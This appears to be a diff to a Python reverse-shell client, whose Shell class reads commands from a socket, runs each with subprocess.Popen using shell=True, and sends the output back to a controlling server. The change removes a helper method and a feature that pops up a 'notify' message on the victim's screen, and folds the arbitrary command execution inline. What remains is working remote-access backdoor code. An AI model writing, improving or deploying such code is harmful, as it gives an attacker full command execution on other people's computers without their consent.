@@ -15,19 +15,6 @@ class Shell:
         :param sock: The socket to send the data through
         '''
         self.sock = sock
-
-    def exec(self, data: str) -> str:
-        '''
-        Executes commands on shell and returns output string
-        
-        :param data: Command to send over to client
-        '''
-        
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout_value = proc.stdout.read() + proc.stderr.read()
-        output_str = str(stdout_value, "UTF-8")
-        
-        return output_str
         
     
     def get_shell(self) -> None:
@@ -52,19 +39,14 @@ class Shell:
                     os.chdir(data[3:])
                     
                 if len(data) > 0:
-                    # Custom functions
-                    
-                    # Send a pop-up notification to client
-                    if data[:6] == "notify":
-                        output_str = exec("msg %username% {}".format(data[7:]))
-                    
                     # Executes arbitrary command
-                    else:
-                        output_str = exec(data)
-                    
+                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout_value = proc.stdout.read() + proc.stderr.read()
+                    output_str = str(stdout_value, "UTF-8")
+        
                     #Sends output back to server
                     self.sock.send(str.encode("\n" + output_str))
-                    
+                
             except:
                 continue
         
